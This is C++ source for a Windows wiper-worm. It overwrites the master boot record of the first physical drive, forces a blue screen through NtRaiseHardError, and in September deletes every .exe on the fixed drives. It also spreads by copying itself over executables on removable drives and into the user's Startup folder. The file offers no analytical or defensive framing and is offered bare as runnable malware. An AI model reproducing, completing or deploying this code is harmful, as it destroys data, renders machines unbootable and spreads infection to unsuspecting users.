#include <iostream>
#include <Windows.h>
#include <Lmcons.h>
#include <ctime>
#include <vector>
#include <string>
#include <stringapiset.h>
#include <tchar.h>
#include <malloc.h>
# define _SILENCE_EXPERIMENTAL_FILESYSTEM_DEPRECATION_WARNING
#include <experimental/filesystem>
#pragma warning(disable : 4996)
namespace fs = std::experimental::filesystem;

#pragma comment(lib, "ntdll.lib")
EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
#include <sys/stat.h>


long Getfilesize(std::string filename)
{
    struct stat stat_buf;
    int rc = stat(filename.c_str(), &stat_buf);
    return rc == 0 ? stat_buf.st_size : -1;
}

// rip
int Destruction() {
	
	
    HANDLE MBRHandle = CreateFileW(L"\\\\.\\PHYSICALDRIVE0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    if (MBRHandle == INVALID_HANDLE_VALUE) {return -1; }
    DWORD bytes_read;

    const unsigned char new_mbr[512] = { 0xB8,0xC0,0x07,0x05,0x20,0x01,0x8E,0xD0,0xBC,0x00,0x10,0xB8,0xC0,0x07,0x8E,0xD8,0xB8,0xC0,0x07,0x8E,0xD8,0xE8,0x00,0x00,0xEB,0x00,0xB4,0x09,0xB9,0x00,0x10,0xB0,0x20,0xB3,0x4F,0xCD,0x10,0xB4,0x0E,0xB0,0x48,0xCD,0x10,0xB0,0x41,0xCD,0x10,0xEB,0xE9,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x55,0xAA };

    if (!WriteFile(MBRHandle, new_mbr, 512, &bytes_read, 0)) {
        return -2;
    }
    CloseHandle(MBRHandle);
    BOOLEAN bl;
    DWORD Response;
    RtlAdjustPrivilege(19, TRUE, FALSE, &bl);
    NtRaiseHardError(STATUS_ASSERTION_FAILURE, NULL, NULL, NULL, 6, &Response);
    return 0;
}




std::vector<std::string> get_all_files_recursive(const std::string& path)
{
    std::vector<std::string> file_names;

    using iterator = fs::recursive_directory_iterator;
    for (iterator iter(path); iter != iterator{}; iter++) {
        file_names.push_back(iter->path().string());
    }
    return file_names;
}
std::string utf8_encode(const std::wstring& wstr)
{
    if (wstr.empty()) return std::string();
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
    std::string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
    return strTo;
}
int worm_on_drive(LPWSTR Drive,LPCWSTR FileName) {
    std::string Drive_str = utf8_encode(Drive);
    const std::vector<std::string> file_list = get_all_files_recursive(Drive_str);
    for (const auto& fn : file_list) {
        if ((fn.substr(fn.length() - 4) == ".exe") == 1) {
            
            LPCWSTR fn_w = std::wstring(fn.begin(), fn.end()).c_str();
         
			
            CopyFileW(FileName, fn_w, FALSE);

            LPWSTR username = (LPWSTR)malloc(sizeof(WCHAR) * UNLEN+1);
            DWORD username_len = UNLEN + 1;
            GetUserNameW(username, &username_len);
            
            std::string startup_s = "C:\\Users\\" + utf8_encode(username) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
			LPCWSTR startup_w = std::wstring(startup_s.begin(), startup_s.end()).c_str();
            
            CopyFileW(FileName, startup_w, TRUE);
			
			
            free(username);
            return 0;
        }
    } 
    return 0;
}

int worm(LPCWSTR FileName) {
    TCHAR Buffer[1024];
    GetLogicalDriveStrings(1024, Buffer);
	TCHAR *Drive = Buffer;
    while (*Drive) {
        if (GetDriveType(Drive) == DRIVE_REMOVABLE) {
            if (worm_on_drive(Drive,FileName) == 0) {
                return 0;
            }
        }
        Drive = &Drive[_tcslen(Drive) + 1];;
    }
    return -1;
}

int del_on_drive(LPWSTR Drive) {
	std::string Drive_str = utf8_encode(Drive);
	const std::vector<std::string> file_list = get_all_files_recursive(Drive_str);
	for (const auto& fn : file_list) {
		if ((fn.substr(fn.length() - 4) == ".exe") == 1) {
            LPCWSTR fn_w = std::wstring(fn.begin(), fn.end()).c_str();
			DeleteFileW(fn_w);
		}
	}
	return 0;
}

int del() {
    TCHAR Buffer[1024];
	GetLogicalDriveStrings(1024, Buffer);
	TCHAR *Drive = Buffer;
	while (*Drive) {
		if (GetDriveType(Drive) == DRIVE_FIXED) {
			if (del_on_drive(Drive) == 0) {
				return 0;
			}
		}
		Drive = &Drive[_tcslen(Drive) + 1];;
	}
	return -1;

}


int main(int argc,const char** argv)
{
    time_t now = time(0);
    tm* ltm = localtime(&now);
    int month = 1 + ltm->tm_mon;
    int day = ltm->tm_mday;
    if (day >= 1 && month == 9) {
        del();
        Destruction(); 
    }
    std::string current_exec_name = argv[0];
    worm(std::wstring(current_exec_name.begin(), current_exec_name.end()).c_str());
    
}


